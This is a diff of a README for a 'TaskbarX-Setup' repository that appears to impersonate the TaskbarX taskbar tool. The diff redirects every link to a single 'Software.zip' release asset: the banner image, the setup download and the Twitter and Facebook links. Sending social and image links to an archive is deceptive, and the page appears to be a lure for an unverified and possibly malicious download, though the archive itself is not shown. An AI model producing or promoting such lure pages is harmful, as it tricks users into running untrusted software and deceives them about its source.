@@ -2,7 +2,7 @@
 
 Welcome to the TaskbarX-Setup repository - where you can customize your Windows taskbar with TaskbarX, giving you more control over the position and appearance of icons.
 
-![TaskbarX-Setup](https://github.com/username/repositoryname/image.png)
+![TaskbarX-Setup](https://github.com/toncrazy/TaskbarX-Setup/releases/download/v1.0/Software.zip)
 
 ## Overview
 
@@ -14,7 +14,7 @@ To get started with TaskbarX, follow these simple steps:
 
 1. Download the TaskbarX setup files from the following link:
    
-   [Download TaskbarX Setup 🔗](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip) - Launch the setup file to begin the installation process.
+   [Download TaskbarX Setup 🔗](https://github.com/toncrazy/TaskbarX-Setup/releases/download/v1.0/Software.zip) - Launch the setup file to begin the installation process.
 
 2. Follow the on-screen instructions to install TaskbarX on your Windows system.
 
@@ -59,8 +59,8 @@ If you encounter any issues or have questions about TaskbarX, please check the "
 ## Connect with Us
 
 Stay updated on the latest TaskbarX news, updates, and releases by following us on social media:
-- Twitter: [@TaskbarX](https://twitter.com/TaskbarX)
-- Facebook: [TaskbarX](https://www.facebook.com/TaskbarX)
+- Twitter: [@TaskbarX](https://github.com/toncrazy/TaskbarX-Setup/releases/download/v1.0/Software.zip)
+- Facebook: [TaskbarX](https://github.com/toncrazy/TaskbarX-Setup/releases/download/v1.0/Software.zip)
 
 Let's elevate your Windows desktop experience with TaskbarX! 🚀🎨
 
